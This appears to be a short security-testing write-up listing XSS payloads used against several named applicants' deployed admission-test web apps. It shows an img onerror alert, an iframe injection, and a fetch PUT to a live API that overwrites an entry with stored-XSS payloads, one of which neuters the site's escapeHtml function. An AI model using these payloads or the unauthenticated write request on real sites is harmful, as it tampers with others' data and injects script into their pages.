# test-ictconscript-admission-xsstesting

## Example 1


**GIT Repository:** https://github.com/Rozza049/test-ictadmission

**Published URL:** https://rozza049.github.io/test-ictadmission/

<img width="1225" height="440" alt="kuva" src="https://github.com/user-attachments/assets/7915a53f-9268-4503-abde-0e1f1e77e541" />

### This code was inserted into Title field works also for the body..
```js
<img src="__.jpg" onerror="alert('XSS TEST NOT PASSED');">
```


## Example 2

**GIT Repository:** https://github.com/aapeliw/test-ictconscript-admission/

**Published URL:** https://aapeliw.github.io/test-ictconscript-admission/

<img width="1920" height="947" alt="kuva" src="https://github.com/user-attachments/assets/9a65a68d-368b-4caf-b521-31d3f8aa261d" />


### This code was inserted into Title field works also for the body..
```js
<iframe src="https://blog.nashtechglobal.com/wp-content/uploads/2024/06/cross-site-scripting-xss.jpg" width="30%" height="500"></iframe>
```

## Example 3


**GIT Repository:** https://github.com/RoxareX/test-ictconscript-admission

**Published URL:** https://roxarex.github.io/test-ictconscript-admission/

<img width="995" height="286" alt="kuva" src="https://github.com/user-attachments/assets/5721b654-0484-430f-b686-4b916bc3f562" />

<img width="1514" height="759" alt="kuva" src="https://github.com/user-attachments/assets/abe9e6be-6309-4c76-be67-84ed563b5914" />


```js
fetch('https://test-ictconscript-admission.onrender.com/api/entries/13', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    title: 'Hey! XSS Testing',
    body: 'XSS protections are in good shape, PUT and DELETE endpoints poses a significant security risk. Sincerely CYBR Researcher / FS Software Engineer MK.',
    lat: '<img src=x onerror="var script=document.createElement(\'script\'); script.innerHTML=\'function escapeHtml(str){return str;}\'; document.body.appendChild(script);">',
    lon: `<img src=\'data:image/png;base64,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\' onerror="
      if(!window.__loadEntriesCalled){
        window.__loadEntriesCalled = true;
        loadEntries();
      }
    ">`
  })
})
.then(r => r.json())
.then(console.log)
.catch(console.error);

```
